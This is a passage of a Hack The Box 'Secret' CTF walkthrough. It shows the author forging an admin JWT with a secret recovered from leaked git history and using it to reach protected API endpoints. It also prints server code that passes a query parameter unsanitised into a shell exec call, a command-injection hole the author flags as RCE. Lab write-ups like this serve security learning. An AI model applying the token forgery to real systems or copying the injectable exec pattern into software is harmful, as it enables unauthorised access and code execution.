+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /api/user/login &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.11.120&lt;/span&gt;
+User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&lt;/span&gt;
+Accept&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/json&lt;/span&gt;
+Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.5&lt;/span&gt;
+Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
+Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+If-None-Match&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;W/&amp;#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&amp;#34;&lt;/span&gt;
+Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
+
+{
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;legiahuyy@email.com&amp;#34;&lt;/span&gt;,
+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;:  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;legiahuyy&amp;#34;&lt;/span&gt;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and the server responses with a JWT string representing our user - &lt;code&gt;legiahuyy&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
+Server&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;nginx/1.18.0 (Ubuntu)&lt;/span&gt;
+Date&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Sat, 22 Jan 2022 11:05:07 GMT&lt;/span&gt;
+Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html; charset=utf-8&lt;/span&gt;
+Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
+X-Powered-By&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Express&lt;/span&gt;
+auth-token&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViZGMwNTBkMTdhMjA0NWQxNTI0MjQiLCJuYW1lIjoibGVnaWFodXl5IiwiZW1haWwiOiJsZWdpYWh1eXlAZW1haWwuY29tIiwiaWF0IjoxNjQyODQ5NTA3fQ.w2orsI3BE8gax-Ik167u_YhAOv4kwuSa-qDuqukEPvE&lt;/span&gt;
+ETag&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;W/&amp;#34;d7-wPhrTaCyHGE5zjXsMLs2pDjBFNk&amp;#34;&lt;/span&gt;
+Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;215&lt;/span&gt;
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViZGMwNTBkMTdhMjA0NWQxNTI0MjQiLCJuYW1lIjoibGVnaWFodXl5IiwiZW1haWwiOiJsZWdpYWh1eXlAZW1haWwuY29tIiwiaWF0IjoxNjQyODQ5NTA3fQ.w2orsI3BE8gax-Ik167u_YhAOv4kwuSa-qDuqukEPvE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A seemingly futile attempt was made to access &lt;code&gt;/api/priv&lt;/code&gt; with the current token and yielded expected response informing our user does not have the specified role. Considering the following two code portions as they verify and grant us access to restricted endpoints, respectively:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// verifytoken.js
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;jsonwebtoken&amp;#34;&lt;/span&gt;);
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auth-token&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;401&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Access Denied&amp;#34;&lt;/span&gt;);
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verified&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;env&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TOKEN_SECRET&lt;/span&gt;);
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;verified&lt;/span&gt;;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;();
+    } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;) {
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid Token&amp;#34;&lt;/span&gt;);
+    }
+};
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// private.js
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;...
+&lt;span style=&#34;color:#75715e&#34;&gt;// /api/priv route:
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userinfo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; }
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userinfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;;
+    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;theadmin&amp;#39;&lt;/span&gt;){
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;creds&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;{
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;role&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;, 
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;theadmin&amp;#34;&lt;/span&gt;,
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;desc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;welcome back admin,&amp;#34;&lt;/span&gt;
+            }
+        })
+    }
+...
+&lt;span style=&#34;color:#75715e&#34;&gt;// /api/logs route:
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;theadmin&amp;#39;&lt;/span&gt;){
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getLogs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`git log --oneline &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;;
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;getLogs&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; , &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;) =&amp;gt;{
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;){
+                &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;);
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+            }
+            &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;);
+        })
+    }
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As the above snippet suggested, &lt;code&gt;auth-token&lt;/code&gt; in our header request with its &lt;code&gt;TOKEN_SECRET&lt;/code&gt; are to be verified, the request is then passed to &lt;code&gt;/api/priv&lt;/code&gt; or &lt;code&gt;/api/logs&lt;/code&gt; for a username comparison and we therefrom have access to the protected resources which are required for the later stage.&lt;/p&gt;
+&lt;p&gt;Usually, when dealing with JWT, one of my favorites is &lt;a href=&#34;https://JWT.io&#34;&gt;JWT.io&lt;/a&gt; because of its straightforward and friendly design but you can always have an alternative &lt;a href=&#34;https://github.com/ticarpi/jwt_tool&#34;&gt;CLI option&lt;/a&gt; in case internet is not available or whatever your reason is. Anyway, we are going with the web version and conveniently paste the received token there.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-22_21-35.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In the previous enumeration step, we have known &lt;code&gt;.env&lt;/code&gt; is from which to look for the secret key. Ergo, we can easily snatch it from the file yet that was just what I thought and consequently, it did take a plenty of time for me to figure out where the &lt;em&gt;original&lt;/em&gt; one is. Try having a guess before you carry on to the solution.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-25_09-49.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And I expect you still remember the extracting process with GitTools in our initial enumeration as it now provides the original &lt;code&gt;TOKEN_SECRET&lt;/code&gt;. With that in mind, let us skim through the dumped contents.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ ls -l ./www/extracted 
+total &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; legiahuyy kali &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 21:55 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; legiahuyy kali &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 21:56 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; legiahuyy kali &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 21:57 2-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; legiahuyy kali &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 21:58 3-de0a46b5107a2f4d26e348303e76d85ae4870934
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; legiahuyy kali &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 21:59 4-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; legiahuyy kali &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 22:00 5-3a367e735ee76569664bf7754eaaade7c735d702
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/Secret&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ cd ./www/extracted/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb     
+
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;legiahuyy㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/…/Secret/www/extracted/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ cat .env                                                      
+DB_CONNECT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mongodb://127.0.0.1:27017/auth-web&amp;#39;&lt;/span&gt;
+TOKEN_SECRET &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thanks to this, we now have the correct token to impersonate &lt;code&gt;theadmin&lt;/code&gt;. As I have mentioned earlier, it is only necessary to modify &lt;code&gt;&amp;quot;name&amp;quot;&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-26_16-05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We then can send a request to the &lt;code&gt;/api/priv&lt;/code&gt; endpoint to test out the newly forged token using Burpsuite.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;// Request
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /api/priv &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.11.120&lt;/span&gt;
+User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&lt;/span&gt;
+Accept&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.5&lt;/span&gt;
+Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
+Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+auth-token&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWYxMGU5ZTYzMmIwZDA0NjNjOWIzYzEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxlZ2lhaHV5eUBlbWFpbC5jb20iLCJpYXQiOjE2NDMxODc4NzV9.EXXnBwTvW4WzwgURoqOP27L0aDR8V1bZ-hVX84dxP90&lt;/span&gt;
+
+// Expected response
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 26 Jan 2022 09:19:11 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 76
+Connection: close
+X-Powered-By: Express
+ETag: W/&amp;#34;4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0&amp;#34;
+
+{&amp;#34;creds&amp;#34;:{&amp;#34;role&amp;#34;:&amp;#34;admin&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;theadmin&amp;#34;,&amp;#34;desc&amp;#34;:&amp;#34;welcome back admin&amp;#34;}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The response has confirmed our solution works successfully, do the same with &lt;code&gt;/api/logs&lt;/code&gt; yields expected result:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;// Request
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /api/logs &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.10.11.120&lt;/span&gt;
+&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;...&lt;/span&gt;
+auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWYxMGU5ZTYzMmIwZDA0NjNjOWIzYzEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxlZ2lhaHV5eUBlbWFpbC5jb20iLCJpYXQiOjE2NDMxODc4NzV9.EXXnBwTvW4WzwgURoqOP27L0aDR8V1bZ-hVX84dxP90
+
+// Response
+HTTP/1.1 500 Internal Server Error
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 26 Jan 2022 09:29:09 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 77
+Connection: close
+X-Powered-By: Express
+ETag: W/&amp;#34;4d-xY8AsU/eUR22Yy/Fqfzp+1blTxU&amp;#34;
+
+{&amp;#34;killed&amp;#34;:false,&amp;#34;code&amp;#34;:128,&amp;#34;signal&amp;#34;:null,&amp;#34;cmd&amp;#34;:&amp;#34;git log --oneline undefined&amp;#34;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;More importantly, this endpoint also has a RCE functionality in the &lt;code&gt;file&lt;/code&gt; parameter as heretofore spotted in &lt;code&gt;private.js&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// private.js
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;...
+&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;;
